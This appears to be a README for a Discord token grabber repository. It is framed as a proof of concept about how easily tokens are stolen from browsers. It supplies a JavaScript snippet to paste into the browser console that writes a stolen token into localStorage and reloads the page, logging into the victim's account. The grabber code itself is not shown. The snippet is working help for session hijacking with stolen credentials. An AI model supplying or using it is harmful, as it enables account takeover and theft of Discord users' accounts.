# POC
This source code of a discord-token-grabber is to show how is to easy to steal the tokens of discord from different browsers

# Tokens
To use the tokens I give you a little code to paste on the browser console 

``` js
let token = "YOUR TOKEN HERE";

function login(token) {
    setInterval(() => {
      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
      location.reload();
    }, 2500);
  }

login(token);
```
